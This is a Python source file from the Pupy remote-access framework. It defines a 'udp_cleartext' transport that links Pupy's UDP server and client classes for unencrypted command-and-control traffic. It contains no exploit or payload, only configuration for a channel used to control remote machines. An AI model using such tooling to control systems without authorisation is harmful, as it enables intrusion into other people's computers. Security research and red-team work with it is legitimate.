# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
from pupy.network.lib import PupyUDPServer, PupyUDPClient, PupyUDPSocketStream
from pupy.network.lib import DummyPupyTransport
from pupy.network.transports import Transport

class TransportConf(Transport):
    info = "Simple UDP transport transmitting in cleartext"
    name="udp_cleartext"
    server=PupyUDPServer
    client=PupyUDPClient
    stream=PupyUDPSocketStream
    client_transport=DummyPupyTransport
    server_transport=DummyPupyTransport
    dgram=True
